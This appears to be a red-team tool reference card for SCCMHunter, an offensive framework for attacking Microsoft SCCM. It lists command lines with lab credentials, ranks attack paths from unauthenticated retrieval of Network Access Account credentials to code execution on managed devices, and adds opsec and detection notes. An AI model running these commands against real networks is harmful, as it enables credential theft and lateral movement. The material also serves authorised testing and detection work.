---
name: SCCMHunter
category: recon
subcategories: [sccm-enumeration, configmgr-attack, lateral-movement, credential-access]
tradecraft_tags: [sccm, mecm, configmgr, python, enumeration, attack-framework, specterops-adjacent]
mitre_attack:
  - id: T1072
    name: Software Deployment Tools
source:
  url: https://github.com/garrettfoster13/sccmhunter
  license: MIT
  maintained: true
binary_type: python-script
binary_filename: sccmhunter.py
supported_os: [linux]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  SCCMHunter issues LDAP, HTTP (to SCCM management point), and SMB traffic to
  enumerate SCCM infrastructure. Unusual client enrollment requests to SCCM management
  points (from non-registered clients) generate SCCM MP logs. NAA credential requests
  generate SCCM policy retrieval events.
usage_examples:
  - description: Discover SCCM infrastructure in the domain
    args: "python3 sccmhunter.py find -u jon.snow -p Password123 -d north.sevenkingdoms.local -dc-ip DC_IP"
  - description: Enumerate SCCM management points and site servers
    args: "python3 sccmhunter.py mssql -u jon.snow -p Password123 -d north.sevenkingdoms.local -dc-ip DC_IP"
  - description: Attempt to retrieve NAA credentials (no auth required for HTTP MP)
    args: "python3 sccmhunter.py http -u jon.snow -p Password123 -d north.sevenkingdoms.local"
  - description: Full SCCM attack chain
    args: "python3 sccmhunter.py smb -u jon.snow -p Password123 -d north.sevenkingdoms.local -dc-ip DC_IP"
opsec_notes: |
  SCCMHunter is a Python framework (infrastructure-side) for systematic SCCM
  enumeration and exploitation. It consolidates multiple SCCM attack vectors
  (HTTP MP unauthenticated, SMB-based, MSSQL-based) into one tool. The HTTP attack
  path (unauthenticated NAA credential retrieval) is the most valuable — it requires
  no existing credentials and yields domain service account credentials. SharpSCCM
  is the Apollo-compatible (.NET) alternative for the same attacks.
gotchas: |
  Python-only — not Apollo-runnable. SCCMHunter is more comprehensive than SharpSCCM
  for initial SCCM enumeration; SharpSCCM is better for on-machine operations via
  Apollo. SCCMHunter's HTTP attack path (unauthenticated NAA retrieval) requires the
  SCCM management point to use HTTP (not HTTPS). SCCM HTTPS enrollment blocks the
  unauthenticated NAA path.
related_ttps: [sharpsccm, sccmwtf, crackmapexec, sharphound]
alternatives: [sharpsccm, sccmwtf]
common_args:
  find:
    description: Discover SCCM infrastructure via LDAP/DNS
    typical_values: [flag-only]
  http:
    description: Attack SCCM via HTTP management point (unauthenticated path)
    typical_values: [flag-only]
  smb:
    description: Attack SCCM via SMB (requires credentials)
    typical_values: [flag-only]
  mssql:
    description: Attack SCCM via MSSQL (requires DB access)
    typical_values: [flag-only]
  -u:
    description: Domain username
    typical_values: ["jon.snow"]
    required: true
  -p:
    description: Password
    typical_values: ["Password123"]
  -d:
    description: Domain FQDN
    typical_values: ["north.sevenkingdoms.local"]
    required: true
  -dc-ip:
    description: Domain controller IP
    typical_values: ["192.168.56.10"]
    required: true
last_updated: 2026-05-29
---

# SCCMHunter

Garrett Foster's comprehensive Python framework for SCCM (Microsoft Endpoint
Configuration Manager) enumeration and exploitation. SCCMHunter consolidates
multiple SCCM attack paths — including the highest-value unauthenticated Network
Access Account (NAA) credential retrieval via HTTP.

## Attack Paths

### HTTP Path (Unauthenticated NAA Credential Retrieval)

The highest-value SCCM attack path — no credentials needed:

```bash
# If SCCM management point uses HTTP (not HTTPS):
sccmhunter.py http -u ANONYMOUS -d domain.local

# Output: NAA credentials (domain service account creds stored on ALL SCCM clients)
# These credentials often have broad read access across the domain
```

### SMB Path

With domain credentials, enumerate SCCM via SMB:
```bash
sccmhunter.py smb -u jon.snow -p Password123 -d domain.local -dc-ip DC_IP
```

### MSSQL Path

If SCCM database access is available:
```bash
sccmhunter.py mssql -u jon.snow -p Password123 -d domain.local -dc-ip DC_IP
```

## SCCM Attack Hierarchy

1. **HTTP (unauthenticated NAA)** → highest value, no creds needed
2. **SMB (authenticated enumeration)** → lists devices, users, groups for lateral movement
3. **Admin path (SCCM Full Admin)** → code execution on all managed devices

## SharpSCCM vs SCCMHunter

| Tool | Language | Best for |
|------|----------|---------|
| SCCMHunter | Python (Linux) | Initial SCCM discovery + unauthenticated paths |
| SharpSCCM | .NET (Windows) | On-machine SCCM operations via Apollo inline_assembly |
